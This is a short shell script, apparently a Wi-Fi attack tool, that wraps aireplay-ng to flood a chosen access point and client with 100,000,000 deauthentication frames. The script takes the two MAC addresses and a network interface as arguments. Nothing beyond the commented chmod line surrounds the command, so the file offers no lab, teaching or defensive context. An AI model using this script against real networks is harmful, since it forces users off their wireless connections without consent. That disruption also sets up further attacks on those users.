#chmod +x deauth_from_net.sh

AP_macad="$1"
client_macad="$2"
nic="$3"

aireplay-ng --deauth 100000000 -a "$AP_macad" -c "$client_macad" "$nic"

